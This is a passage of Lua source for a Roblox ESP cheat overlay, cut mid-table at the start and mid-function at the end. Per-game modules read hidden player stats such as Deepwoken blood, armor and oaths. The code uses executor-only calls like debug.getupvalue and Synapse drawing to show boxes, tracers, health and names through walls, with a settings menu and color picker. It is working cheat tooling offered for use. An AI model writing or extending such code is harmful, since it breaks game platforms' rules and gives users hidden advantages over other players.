		CustomPlayerTag = function(Player)
			local Name = '';

			if Player:FindFirstChild'leaderstats' then
				Name = Name .. '\n[';
				local Prefix = '';
				local Extra = {};
				if Player.leaderstats:FindFirstChild'Prestige' and Player.leaderstats.Prestige.ClassName == 'IntValue' and Player.leaderstats.Prestige.Value > 0 then
					Name = Name .. '#' .. tostring(Player.leaderstats.Prestige.Value) .. ' ';
				end
				if Player.leaderstats:FindFirstChild'HouseRank' and Player.leaderstats:FindFirstChild'Gender' and Player.leaderstats.HouseRank.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.HouseRank.Value) then
					Prefix = Player.leaderstats.HouseRank.Value == 'Owner' and (Player.leaderstats.Gender.Value == 'Female' and 'Lady ' or 'Lord ') or '';
				end
				if Player.leaderstats:FindFirstChild'FirstName' and Player.leaderstats.FirstName.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.FirstName.Value) then
					Name = Name .. '' .. Prefix .. Player.leaderstats.FirstName.Value;
				end
				if Player.leaderstats:FindFirstChild'LastName' and Player.leaderstats.LastName.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.LastName.Value) then
					Name = Name .. ' ' .. Player.leaderstats.LastName.Value;
				end
				if Player.leaderstats:FindFirstChild'UberTitle' and Player.leaderstats.UberTitle.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.UberTitle.Value) then
					Name = Name .. ', ' .. Player.leaderstats.UberTitle.Value;
				end

				if not IsStringEmpty(Name) then Name = Name .. ']'; end

				local Character = GetCharacter(Player);

				if Character then
					if Character and Character:FindFirstChild'Danger' then table.insert(Extra, 'D'); end
					if Character:FindFirstChild'ManaAbilities' and Character.ManaAbilities:FindFirstChild'ManaSprint' then table.insert(Extra, 'D1'); end

					if Character:FindFirstChild'Mana'	 		then table.insert(Extra, 'M' .. math.floor(Character.Mana.Value)); end
					if Character:FindFirstChild'Vampirism' 		then table.insert(Extra, 'V');    end
					if Character:FindFirstChild'Observe'			then table.insert(Extra, 'ILL');  end
					if Character:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					
					if Character:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
					if Character:FindFirstChild'Head' and Character.Head:FindFirstChild'FacialMarking' then
						local FM = Character.Head:FindFirstChild'FacialMarking';
						if FM.Texture == 'http://www.roblox.com/asset/?id=4072968006' then
							table.insert(Extra, 'HEALER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072914434' then
							table.insert(Extra, 'SEER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4094417635' then
							table.insert(Extra, 'JESTER');
						end
					end
				end
				if Player:FindFirstChild'Backpack' then
					if Player.Backpack:FindFirstChild'Observe' 			then table.insert(Extra, 'ILL');  end
					if Player.Backpack:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					if Player.Backpack:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
				end

				if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
			end

			return Name;
		end;
	};

	[4691401390] = { -- Vast Realm
		CustomCharacter = function(Player)
			if workspace:FindFirstChild'Players' then
				return workspace.Players:FindFirstChild(Player.Name);
			end
		end
	};

    [6032399813] = { -- Deepwoken [Etrean]
		CustomPlayerTag = function(Player)
			local Name = '';
            CharacterName = Player:GetAttribute'CharacterName'; -- could use leaderstats but lazy

            if not IsStringEmpty(CharacterName) then
                Name = ('\n[%s]'):format(CharacterName);
                local Character = GetCharacter(Player);
                local Extra = {};

                if Character then
                    local Blood, Armor = Character:FindFirstChild('Blood'), Character:FindFirstChild('Armor');

                    if Blood and Blood.ClassName == 'DoubleConstrainedValue' then
                        table.insert(Extra, ('B%d'):format(Blood.Value));
                    end

                    if Armor and Armor.ClassName == 'DoubleConstrainedValue' then
                        table.insert(Extra, ('A%d'):format(math.floor(Armor.Value / 10)));
                    end
                end

                local BackpackChildren = Player.Backpack:GetChildren()

                for index = 1, #BackpackChildren do
                    local Oath = BackpackChildren[index]
                    if Oath.ClassName == 'Folder' and Oath.Name:find('Talent:Oath') then
                        local OathName = Oath.Name:gsub('Talent:Oath: ', '')
                        table.insert(Extra, OathName);
                    end
                end

                if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
            end

			return Name;
		end;
	};

    [5735553160] = { -- Deepwoken [Depths]
		CustomPlayerTag = function(Player)
			local Name = '';
			CharacterName = Player:GetAttribute'CharacterName'; -- could use leaderstats but lazy

			if not IsStringEmpty(CharacterName) then
				Name = ('\n[%s]'):format(CharacterName);
				local Character = GetCharacter(Player);
				local Extra = {};

				if Character then
					local Blood, Armor = Character:FindFirstChild('Blood'), Character:FindFirstChild('Armor');

					if Blood and Blood.ClassName == 'DoubleConstrainedValue' then
						table.insert(Extra, ('B%d'):format(Blood.Value));
					end

					if Armor and Armor.ClassName == 'DoubleConstrainedValue' then
						table.insert(Extra, ('A%d'):format(math.floor(Armor.Value / 10)));
					end
				end

				local BackpackChildren = Player.Backpack:GetChildren()

				for index = 1, #BackpackChildren do
					local Oath = BackpackChildren[index]
					if Oath.ClassName == 'Folder' and Oath.Name:find('Talent:Oath') then
						local OathName = Oath.Name:gsub('Talent:Oath: ', '')
						table.insert(Extra, OathName);
					end
				end

				if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
			end

			return Name;
		end;
	};

	[3127094264] = {
		CustomCharacter = function(Player)
			if not _FIRST then
				_FIRST = true
				
				pcall(function()
					local GPM = rawget(require(LocalPlayer.PlayerScripts:WaitForChild('Client', 1e9):WaitForChild('Player', 1e9)), 'GetPlayerModel')
					PList = debug.getupvalue(GPM, 1)
				end)
			end

			if PList then
				local Player = rawget(PList, Player.UserId)

				if Player and Player.model then
					return Player.model
				end
			end
		end
	}
};

if Modules[game.PlaceId] ~= nil or Modules[game.GameId] ~= nil then
	local Module = Modules[game.PlaceId] or Modules[game.GameId]
	CustomPlayerTag = Module.CustomPlayerTag or nil
	CustomESP = Module.CustomESP or nil
	CustomCharacter = Module.CustomCharacter or nil
	GetHealth = Module.GetHealth or nil
	GetAliveState = Module.GetAliveState or nil
	CustomRootPartName = Module.CustomRootPartName or nil
end

function GetCharacter(Player)
	return Player.Character or (CustomCharacter and CustomCharacter(Player));
end

function GetMouseLocation()
	return UserInputService:GetMouseLocation();
end

function MouseHoveringOver(Values)
	local X1, Y1, X2, Y2 = Values[1], Values[2], Values[3], Values[4]
	local MLocation = GetMouseLocation();
	return (MLocation.x >= X1 and MLocation.x <= (X1 + (X2 - X1))) and (MLocation.y >= Y1 and MLocation.y <= (Y1 + (Y2 - Y1)));
end

function GetTableData(t) -- basically table.foreach i dont even know why i made this
	if typeof(t) ~= 'table' then return end

	return setmetatable(t, {
		__call = function(t, func)
			if typeof(func) ~= 'function' then return end;
			for i, v in pairs(t) do
				pcall(func, i, v);
			end
		end;
	});
end
local function Format(format, ...)
	return string.format(format, ...);
end
function CalculateValue(Min, Max, Percent)
	return Min + math.floor(((Max - Min) * Percent) + .5);
end

function NewDrawing(InstanceName)
	local Instance = Drawing.new(InstanceName)

	return (function(Properties)
		for i, v in pairs(Properties) do
			pcall(Set, Instance, i, v)
		end

		return Instance
	end)
end

function Menu:AddMenuInstance(Name, DrawingType, Properties)
	local Instance;

	if shared.MenuDrawingData.Instances[Name] ~= nil then
		Instance = shared.MenuDrawingData.Instances[Name];
		for i, v in pairs(Properties) do
			pcall(Set, Instance, i, v);
		end
	else
		Instance = NewDrawing(DrawingType)(Properties);
	end

	shared.MenuDrawingData.Instances[Name] = Instance;

	return Instance;
end
function Menu:UpdateMenuInstance(Name)
	local Instance = shared.MenuDrawingData.Instances[Name];
	if Instance ~= nil then
		return (function(Properties)
			for i, v in pairs(Properties) do
				pcall(Set, Instance, i, v);
			end
			return Instance;
		end)
	end
end
function Menu:GetInstance(Name)
	return shared.MenuDrawingData.Instances[Name];
end

local Options = setmetatable({}, {
	__call = function(t, ...)
		local Arguments = {...};
		local Name = Arguments[1];
		OIndex = OIndex + 1;
		rawset(t, Name, setmetatable({
			Name			= Arguments[1];
			Text			= Arguments[2];
			Value			= Arguments[3];
			DefaultValue	= Arguments[3];
			AllArgs			= Arguments;
			Index			= OIndex;
		}, {
			__call = function(t, v, force)
				local self = t;

				if typeof(t.Value) == 'function' then
					t.Value();
				elseif typeof(t.Value) == 'EnumItem' then
					local BT = Menu:GetInstance(Format('%s_BindText', t.Name));
					if not force then
						Binding = true;
						local Val = 0
						while Binding do
							wait();
							Val = (Val + 1) % 17;
							BT.Text = Val <= 8 and '|' or '';
						end
					end
					t.Value = force and v or BindedKey;
					if BT and t.BasePosition and t.BaseSize then
						BT.Text = tostring(t.Value):match'%w+%.%w+%.(.+)';
						BT.Position = t.BasePosition + V2New(t.BaseSize.X - BT.TextBounds.X - 20, -10);
					end
				else
					local NewValue = v;
					if NewValue == nil then NewValue = not t.Value; end
					rawset(t, 'Value', NewValue);

					if Arguments[2] ~= nil and Menu:GetInstance'TopBar'.Visible then
						if typeof(Arguments[3]) == 'number' then
							local AMT = Menu:GetInstance(Format('%s_AmountText', t.Name));
							if AMT then
								AMT.Text = tostring(t.Value);
							end
						else
							local Inner = Menu:GetInstance(Format('%s_InnerCircle', t.Name));
							if Inner then Inner.Visible = t.Value; end
						end
					end
				end
			end;
		}));
	end;
})

function Load()
	local _, Result = pcall(readfile, OptionsFile);
	
	if _ then -- extremely ugly code yea i know but i dont care p.s. i hate pcall
		local _, Table = pcall(HttpService.JSONDecode, HttpService, Result);
		if _ and typeof(Table) == 'table' then
			for i, v in pairs(Table) do
				if typeof(Options[i]) == 'table' and Options[i].Value ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number') then
					Options[i].Value = v.Value;
					pcall(Options[i], v.Value);
				end
			end

			if Table.TeamColor then TeamColor = Color3.new(Table.TeamColor.R, Table.TeamColor.G, Table.TeamColor.B) end
			if Table.EnemyColor then EnemyColor = Color3.new(Table.EnemyColor.R, Table.EnemyColor.G, Table.EnemyColor.B) end

			if typeof(Table.MenuKey) == 'string' then Options.MenuKey(Enum.KeyCode[Table.MenuKey], true) end
			if typeof(Table.ToggleKey) == 'string' then Options.ToggleKey(Enum.KeyCode[Table.ToggleKey], true) end
		end
	end
end

Options('Enabled', 'Enabled', false);
Options('ShowTeam', 'Team', false);
Options('ShowTeamColor', 'Team Color', false);
Options('ShowName', 'Names', false);
Options('ShowDistance', 'Distance', false);
Options('ShowHealth', 'Health', false);
Options('ShowBoxes', 'Boxes', true);
Options('ShowTracers', 'Tracers', false);
Options('ShowDot', 'Head Dot', false);
Options('VisCheck', 'VisCheck', false);
Options('Crosshair', 'Crosshair', false);
Options('TextOutline', 'Text Outline', true);
-- Options('Rainbow', 'Rainbow Mode', false);
Options('TextSize', 'Text Sizing', syn and 18 or 14, 10, 24); -- cuz synapse fonts look weird???
Options('MaxDistance', 'Distance', 2500, 100, 25000);
Options('RefreshRate', 'Refresh (ms)', 5, 1, 200);
Options('YOffset', 'Y Offset', 0, -200, 200);
Options('MenuKey', 'Menu Key', Enum.KeyCode.F4, 1);
Options('ToggleKey', 'Toggle Key', Enum.KeyCode.F3, 1);
Options('ChangeColors', SENTINEL_LOADED and 'Sentinel Unsupported' or 'Change Colors', function()
	if SENTINEL_LOADED then return end
	SubMenu:Show(GetMouseLocation(), 'Unnamed Colors', {
		{
			Type = 'Color'; Text = 'Team Color'; Color = TeamColor;

			Function = function(Circ, Position)
				if tick() - ColorPicker.LastGenerated < 1 then return; end

				if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end
				local ColorPicker = ColorPicker.new(Position - V2New(-10, 50));
				CurrentColorPicker = ColorPicker;
				shared.CurrentColorPicker = CurrentColorPicker;
				ColorPicker.ColorChanged:Connect(function(Color) Circ.Color = Color TeamColor = Color Options.TeamColor = Color end);
			end
		};
		{
			Type = 'Color'; Text = 'Enemy Color'; Color = EnemyColor;

			Function = function(Circ, Position)
				if tick() - ColorPicker.LastGenerated < 1 then return; end

				if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end
				local ColorPicker = ColorPicker.new(Position - V2New(-10, 50));
				CurrentColorPicker = ColorPicker;
				shared.CurrentColorPicker = CurrentColorPicker;
				ColorPicker.ColorChanged:Connect(function(Color) Circ.Color = Color EnemyColor = Color Options.EnemyColor = Color end);
			end
		};
		{
			Type = 'Button'; Text = 'Reset Colors';

			Function = function()
				EnemyColor = Color3.new(1, 0, 0);
				TeamColor = Color3.new(0, 1, 0);

				local C1 = Menu:GetInstance'Sub-ColorPreview.1'; if C1 then C1.Color = TeamColor end
				local C2 = Menu:GetInstance'Sub-ColorPreview.2'; if C2 then C2.Color = EnemyColor end
			end
		};
		{
			Type = 'Button'; Text = 'Rainbow Mode';

			Function = function()
				Rainbow = not Rainbow;
			end
		};
	});
end, 2);
Options('ResetSettings', 'Reset Settings', function()
	for i, v in pairs(Options) do
		if Options[i] ~= nil and Options[i].Value ~= nil and Options[i].Text ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number' or typeof(Options[i].Value) == 'EnumItem') then
			Options[i](Options[i].DefaultValue, true);
		end
	end
end, 5);
Options('LoadSettings', 'Load Settings', Load, 4);
Options('SaveSettings', 'Save Settings', function()
	local COptions = {};

	for i, v in pairs(Options) do
		COptions[i] = v;
	end
	
	if typeof(TeamColor) == 'Color3' then COptions.TeamColor = { R = TeamColor.R; G = TeamColor.G; B = TeamColor.B } end
	if typeof(EnemyColor) == 'Color3' then COptions.EnemyColor = { R = EnemyColor.R; G = EnemyColor.G; B = EnemyColor.B } end
	
	if typeof(COptions.MenuKey.Value) == 'EnumItem' then COptions.MenuKey = COptions.MenuKey.Value.Name end
	if typeof(COptions.ToggleKey.Value) == 'EnumItem' then COptions.ToggleKey = COptions.ToggleKey.Value.Name end

	writefile(OptionsFile, HttpService:JSONEncode(COptions));
end, 3);

Load(1);

Options('MenuOpen', nil, true);

local function Combine(...)
	local Output = {};
	for i, v in pairs{...} do
		if typeof(v) == 'table' then
			table.foreach(v, function(i, v)
				Output[i] = v;
			end)
		end
	end
	return Output
end

function LineBox:Create(Properties)
	local Box = { Visible = true }; -- prevent errors not really though dont worry bout the Visible = true thing

	local Properties = Combine({
		Transparency	= 1;
		Thickness		= 3;
		Visible			= true;
	}, Properties);

	if shared.am_ic3 then -- sory just my preference, dynamic boxes will be optional in unnamed esp v2
		Box['OutlineSquare']= NewDrawing'Square'(Properties);
		Box['Square'] 		= NewDrawing'Square'(Properties);
	elseif QUAD_SUPPORTED_EXPLOIT then
		Box['Quad']			= NewDrawing'Quad'(Properties);
	else
		Box['TopLeft']		= NewDrawing'Line'(Properties);
		Box['TopRight']		= NewDrawing'Line'(Properties);
		Box['BottomLeft']	= NewDrawing'Line'(Properties);
		Box['BottomRight']	= NewDrawing'Line'(Properties);
	end

	function Box:Update(CF, Size, Color, Properties, Parts)
		if not CF or not Size then return end

		if shared.am_ic3 and typeof(Parts) == 'table' then
			local AllCorners = {};
			
			for i, v in pairs(Parts) do
				-- if not v:IsA'BasePart' then continue end
				
				local CF, Size = v.CFrame, v.Size;
				-- CF, Size = v.Parent:GetBoundingBox();

				local Corners = {
					Vector3.new(CF.X + Size.X / 2, CF.Y + Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y + Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y - Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y - Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y + Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y + Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y - Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y - Size.Y / 2, CF.Z + Size.Z / 2);
				};

				for i, v in pairs(Corners) do
					table.insert(AllCorners, v);
				end

				-- break
			end

			local xMin, yMin = Camera.ViewportSize.X, Camera.ViewportSize.Y;
			local xMax, yMax = 0, 0;
			local Vs = true;

			for i, v in pairs(AllCorners) do				
				local Position, V = WorldToViewport(v);

				if VS and not V then Vs = false break end

				if Position.X > xMax then
					xMax = Position.X;
				end
				if Position.X < xMin then
					xMin = Position.X;
				end
				if Position.Y > yMax then
					yMax = Position.Y;
				end
				if Position.Y < yMin then
					yMin = Position.Y;
				end
			end

			local xSize, ySize = xMax - xMin, yMax - yMin;

			local Outline = Box['OutlineSquare'];
			local Square = Box['Square'];
			Outline.Visible = Vs;
			Square.Visible = Vs;
			Square.Position = V2New(xMin, yMin);
			Square.Color	= Color;
			Square.Thickness = math.floor(Outline.Thickness * 0.3);
			-- Square.Position = V2New(xMin, yMin);
			Square.Size = V2New(xSize, ySize);
			Outline.Position = Square.Position;
			Outline.Size = Square.Size;
			Outline.Color = Color3.new(0.12, 0.12, 0.12);
			Outline.Transparency = 0.75;

			return
		end
		
		local TLPos, Visible1	= WorldToViewport((CF * CFrame.new( Size.X,  Size.Y, 0)).Position);
		local TRPos, Visible2	= WorldToViewport((CF * CFrame.new(-Size.X,  Size.Y, 0)).Position);
		local BLPos, Visible3	= WorldToViewport((CF * CFrame.new( Size.X, -Size.Y, 0)).Position);
		local BRPos, Visible4	= WorldToViewport((CF * CFrame.new(-Size.X, -Size.Y, 0)).Position);

		local Quad = Box['Quad'];

		if QUAD_SUPPORTED_EXPLOIT then
			if Visible1 and Visible2 and Visible3 and Visible4 then
				Quad.Visible = true;
				Quad.Color	= Color;
				Quad.PointA = V2New(TLPos.X, TLPos.Y);
				Quad.PointB = V2New(TRPos.X, TRPos.Y);
				Quad.PointC = V2New(BRPos.X, BRPos.Y);
				Quad.PointD = V2New(BLPos.X, BLPos.Y);
			else
				Box['Quad'].Visible = false;
			end
		else
			Visible1 = TLPos.Z > 0 -- (commented | reason: random flashes);
			Visible2 = TRPos.Z > 0 -- (commented | reason: random flashes);
			Visible3 = BLPos.Z > 0 -- (commented | reason: random flashes);
			Visible4 = BRPos.Z > 0 -- (commented | reason: random flashes);

			-- ## BEGIN UGLY CODE
			if Visible1 then
				Box['TopLeft'].Visible		= true;
				Box['TopLeft'].Color		= Color;
				Box['TopLeft'].From			= V2New(TLPos.X, TLPos.Y);
				Box['TopLeft'].To			= V2New(TRPos.X, TRPos.Y);
			else
				Box['TopLeft'].Visible		= false;
			end
			if Visible2 then
				Box['TopRight'].Visible		= true;
				Box['TopRight'].Color		= Color;
				Box['TopRight'].From		= V2New(TRPos.X, TRPos.Y);
				Box['TopRight'].To			= V2New(BRPos.X, BRPos.Y);
			else
				Box['TopRight'].Visible		= false;
			end
			if Visible3 then
				Box['BottomLeft'].Visible	= true;
				Box['BottomLeft'].Color		= Color;
				Box['BottomLeft'].From		= V2New(BLPos.X, BLPos.Y);
				Box['BottomLeft'].To		= V2New(TLPos.X, TLPos.Y);
			else
				Box['BottomLeft'].Visible	= false;
			end
			if Visible4 then
				Box['BottomRight'].Visible	= true;
				Box['BottomRight'].Color	= Color;
				Box['BottomRight'].From		= V2New(BRPos.X, BRPos.Y);
				Box['BottomRight'].To		= V2New(BLPos.X, BLPos.Y);
			else
				Box['BottomRight'].Visible	= false;
			end
			if Properties and typeof(Properties) == 'table' then
				GetTableData(Properties)(function(i, v)
					pcall(Set, Box['TopLeft'],		i, v);
					pcall(Set, Box['TopRight'],		i, v);
					pcall(Set, Box['BottomLeft'],	i, v);
					pcall(Set, Box['BottomRight'],	i, v);
				end)
			end
			-- ## END UGLY CODE
		end
	end
	function Box:SetVisible(bool)
		if shared.am_ic3 then
			Box['Square'].Visible = bool;
			Box['OutlineSquare'].Visible = bool;
		elseif self.Quad then
			self.Quad.Visible = false
		elseif self.TopLeft and self.TopRight and self.BottomLeft and self.BottomRight then
			self.TopLeft.Visible = bool
			self.TopRight.Visible = bool
			self.BottomLeft.Visible = bool
			self.BottomRight.Visible = bool
		end
	end
	function Box:Remove()
		self:SetVisible(false)

		if shared.am_ic3 then
			Box['Square']:Remove()
			Box['OutlineSquare']:Remove()
		elseif self.Quad then
			Box['Quad']:Remove()
		elseif self.TopLeft and self.TopRight and self.BottomLeft and self.BottomRight then
			self.TopLeft:Remove()
			self.TopRight:Remove()
			self.BottomLeft:Remove()
			self.BottomRight:Remove()
		end
	end

	return Box;
end

local Colors = {
	White = Color3.fromHex'ffffff',
	Primary = {
		Main	= Color3.fromHex'424242',
		Light	= Color3.fromHex'6d6d6d',
		Dark	= Color3.fromHex'1b1b1b'
	},
	Secondary = {
		Main	= Color3.fromHex'e0e0e0',
		Light	= Color3.fromHex'ffffff',
		Dark	= Color3.fromHex'aeaeae'
	}
}

function Connections:Listen(Connection, Function)
    local NewConnection = Connection:Connect(Function);
    table.insert(self.Active, NewConnection);
    return NewConnection;
end

function Connections:DisconnectAll()
    for Index, Connection in pairs(self.Active) do
        if Connection.Connected then
            Connection:Disconnect();
        end
    end
    
    self.Active = {};
end

function Signal.new()
	local self = setmetatable({ _BindableEvent = Instance.new'BindableEvent' }, Signal);
    
	return self;
end

function Signal:Connect(Callback)
    assert(typeof(Callback) == 'function', 'function expected; got ' .. typeof(Callback));

	return self._BindableEvent.Event:Connect(function(...) Callback(...) end);
end

function Signal:Fire(...)
    self._BindableEvent:Fire(...);
end

function Signal:Wait()
    local Arguments = self._BindableEvent:Wait();

    return Arguments;
end

function Signal:Disconnect()
    if self._BindableEvent then
        self._BindableEvent:Destroy();
    end
end

local function GetMouseLocation()
	return UserInputService:GetMouseLocation();
end

local function IsMouseOverDrawing(Drawing, MousePosition)
	local TopLeft = Drawing.Position;
	local BottomRight = Drawing.Position + Drawing.Size;
    local MousePosition = MousePosition or GetMouseLocation();
    
    return MousePosition.X > TopLeft.X and MousePosition.Y > TopLeft.Y and MousePosition.X < BottomRight.X and MousePosition.Y < BottomRight.Y;
end

local ImageCache = {};

local function SetImage(Drawing, Url)
	local Data = IsSynapse and game:HttpGet(Url) or Url;

	Drawing[IsSynapse and 'Data' or 'Uri'] = ImageCache[Url] or Data;
	ImageCache[Url] = Data;
    
	if not IsSynapse then repeat wait() until Drawing.Loaded; end
end

-- oh god unnamed esp needs an entire rewrite, someone make a better one pls im too lazy
-- btw the color picker was made seperately so it doesnt fit with the code of unnamed esp

local function CreateDrawingsTable()
    local Drawings = { __Objects = {} };
    local Metatable = {};

    function Metatable.__index(self, Index)
        local Object = rawget(self.__Objects, Index);
        
        if not Object or (IsSynapse and not Object.__SELF.__OBJECT_EXISTS) then
            local Type = Index:sub(1, Index:find'-' - 1);

            Success, Object = pcall(Drawing.new, Type);

            if not Object or not Success then return function() end; end

            self.__Objects[Index] = setmetatable({ __SELF = Object; Type = Type }, {
                __call = function(self, Properties)
                    local Object = rawget(self, '__SELF'); if IsSynapse and not Object.__OBJECT_EXISTS then return false, 'render object destroyed'; end

                    if Properties == false then
                        Object.Visible = false;
                        Object.Transparency = 0;
                        Object:Remove();
                        
                        return true;
                    end
                    
                    if typeof(Properties) == 'table' then
                        for Property, Value in pairs(Properties) do
                            local CanSet = true;

                            if self.Type == 'Image' and not IsSynapse and Property == 'Size' and typeof(Value) == 'Vector2' then
                                CanSet = false;

                                spawn(function()
                                    repeat wait() until Object.Loaded;
                                    if not self.DefaultSize then rawset(self, 'DefaultSize', Object.Size) end

                                    Property = 'ScaleFactor';
                                    Value = Value.X / self.DefaultSize.X;

                                    Object[Property] = Value
                                end)
                            end
                            
                            if CanSet then Object[Property] = Value end
                        end
                    end

                    return Object;
                end
            });

            Object.Visible = true;
            Object.Transparency = 1; -- Transparency is really Opacity with drawing api (1 being visible, 0 being invisible)
            
            if Type == 'Text' then
                if Drawing.Fonts then Object.Font = Drawing.Fonts.Monospace end
                Object.Size = 20;
                Object.Color = Color3.new(1, 1, 1);
                Object.Center = true;
				Object.Outline = true;
				OutlineOpacity = 0.5;
            elseif Type == 'Square' or Type == 'Rectangle' then
                Object.Thickness = 2;
                Object.Filled = false;
            end

            return self.__Objects[Index];
        end

        return Object;
    end

    function Metatable.__call(self, Delete, ...)
        local Arguments = {Delete, ...};
        
        if Delete == false then
            for Index, Drawing in pairs(rawget(self, '__Objects')) do
                Drawing(false);
            end
        end
    end

    return setmetatable(Drawings, Metatable);
end

local Images = {}

spawn(function()
	Images.Ring = 'https://i.imgur.com/q4qx26f.png'
	Images.Overlay = 'https://i.imgur.com/gOCxbsR.png'
end)

function ColorPicker.new(Position, Size, Color)
	ColorPicker.LastGenerated = tick();
	ColorPicker.Loading = true;

    local self = { Color = Color or Color3.new(1, 1, 1); HSV = { H = 0, S = 1, V = 1 } };
    local Drawings = CreateDrawingsTable();
    local Position = Position or V2New();
    local Size = Size or 150;
    local Padding = { 10, 10, 10, 10 };
    
    self.ColorChanged = Signal.new();

    local Background = Drawings['Square-Background'] {
        Color = Color3.fromRGB(33, 33, 33);
		Filled = false;
		Visible = false;
        Position = Position - V2New(Padding[4], Padding[1]);
        Size = V2New(Size, Size) + V2New(Padding[4] + Padding[2], Padding[1] + Padding[3]);
    };
    local ColorPreview = Drawings['Circle-Preview'] {
        Position = Position + (V2New(Size, Size) / 2);
        Radius = Size / 2 - 8;
        Filled = true;
        Thickness = 0;
        NumSides = 20;
        Color = Color3.new(1, 0, 0);
    };
    local Main = Drawings['Image-Main'] {
        Position = Position;
        Size = V2New(Size, Size);
    }; SetImage(Main, Images.Ring);
    local Preview = Drawings['Square-Preview'] {
        Position = Main.Position + (Main.Size / 4.5);
        Size = Main.Size / 1.75;
        Color = Color3.new(1, 0, 0);
        Filled = true;
        Thickness = 0;
    };
    local Overlay = Drawings['Image-Overlay'] {
        Position = Preview.Position;
        Size = Preview.Size;
        Transparency = 1;
    }; SetImage(Overlay, Images.Overlay);
    local CursorOutline = Drawings['Circle-CursorOutline'] {
        Radius = 4;
        Thickness = 2;
        Filled = false;
        Color = Color3.new(0.2, 0.2, 0.2);
        Position = V2New(Main.Position.X + Main.Size.X - 10, Main.Position.Y + (Main.Size.Y / 2));
    };
    local Cursor = Drawings['Circle-Cursor'] {
        Radius = 3;
        Transparency = 1;
        Filled = true;
        Color = Color3.new(1, 1, 1);
        Position = CursorOutline.Position;
    };
    local CursorOutline = Drawings['Circle-CursorOutlineSquare'] {
        Radius = 4;
        Thickness = 2;
        Filled = false;
        Color = Color3.new(0.2, 0.2, 0.2);
        Position = V2New(Preview.Position.X + Preview.Size.X - 2, Preview.Position.Y + 2);
    };
    Drawings['Circle-CursorSquare'] {
        Radius = 3;
        Transparency = 1;
        Filled = true;
        Color = Color3.new(1, 1, 1);
        Position = CursorOutline.Position;
    };
    
    function self:UpdatePosition(Input)
        local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);

        if self.MouseHeld then
            if self.Item == 'Ring' then
                local Main = self.Drawings['Image-Main'] ();
                local Preview = self.Drawings['Square-Preview'] ();
                local Bounds = Main.Size / 2;
                local Center = Main.Position + Bounds;
                local Relative = MousePosition - Center;
                local Direction = Relative.unit;
                local Position = Center + Direction * Main.Size.X / 2.15;
                local H = (math.atan2(Position.Y - Center.Y, Position.X - Center.X)) * 60;
                if H < 0 then H = 360 + H; end
                H = H / 360;
                self.HSV.H = H;
                local EndColor = Color3.fromHSV(H, self.HSV.S, self.HSV.V); if EndColor ~= self.Color then self.ColorChanged:Fire(self.Color); end
                local Pointer = self.Drawings['Circle-Cursor'] { Position = Position };
                self.Drawings['Circle-CursorOutline'] { Position = Pointer.Position };
                Bounds = Bounds * 2;
                Preview.Color = Color3.fromHSV(H, 1, 1);
                self.Color = EndColor;
                self.Drawings['Circle-Preview'] { Color = EndColor };
            elseif self.Item == 'HL' then
                local Preview = self.Drawings['Square-Preview'] ();
                local HSV = self.HSV;
                local Position = V2New(math.clamp(MousePosition.X, Preview.Position.X, Preview.Position.X + Preview.Size.X), math.clamp(MousePosition.Y, Preview.Position.Y, Preview.Position.Y + Preview.Size.Y));
                HSV.S = (Position.X - Preview.Position.X) / Preview.Size.X;
                HSV.V = 1 - (Position.Y - Preview.Position.Y) / Preview.Size.Y;
                local EndColor = Color3.fromHSV(HSV.H, HSV.S, HSV.V); if EndColor ~= self.Color then self.ColorChanged:Fire(self.Color); end
                self.Color = EndColor;
                self.Drawings['Circle-Preview'] { Color = EndColor };
                local Pointer = self.Drawings['Circle-CursorSquare'] { Position = Position };
                self.Drawings['Circle-CursorOutlineSquare'] { Position = Pointer.Position };
            end
        end
    end

    function self:HandleInput(Input, P, Type)
        if Type == 'Began' then
            if Input.UserInputType.Name == 'MouseButton1' then
                local Main = self.Drawings['Image-Main'] ();
                local SquareSV = self.Drawings['Square-Preview'] ();
                local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);
                self.MouseHeld = true;
                local Bounds = Main.Size / 2;
                local Center = Main.Position + Bounds;
                local R = (MousePosition - Center);
        
                if R.Magnitude < Bounds.X and R.Magnitude > Bounds.X - 20 then
                    self.Item = 'Ring';
                end
                
                if MousePosition.X > SquareSV.Position.X and MousePosition.Y > SquareSV.Position.Y and MousePosition.X < SquareSV.Position.X + SquareSV.Size.X and MousePosition.Y < SquareSV.Position.Y + SquareSV.Size.Y then
                    self.Item = 'HL';
                end

                self:UpdatePosition(Input, P);
            end
        elseif Type == 'Changed' then
            if Input.UserInputType.Name == 'MouseMovement' then
                self:UpdatePosition(Input, P);
            end
        elseif Type == 'Ended' and Input.UserInputType.Name == 'MouseButton1' then
            self.Item = nil;
        end
	end
	
	function self:Dispose()
		self.Drawings(false);
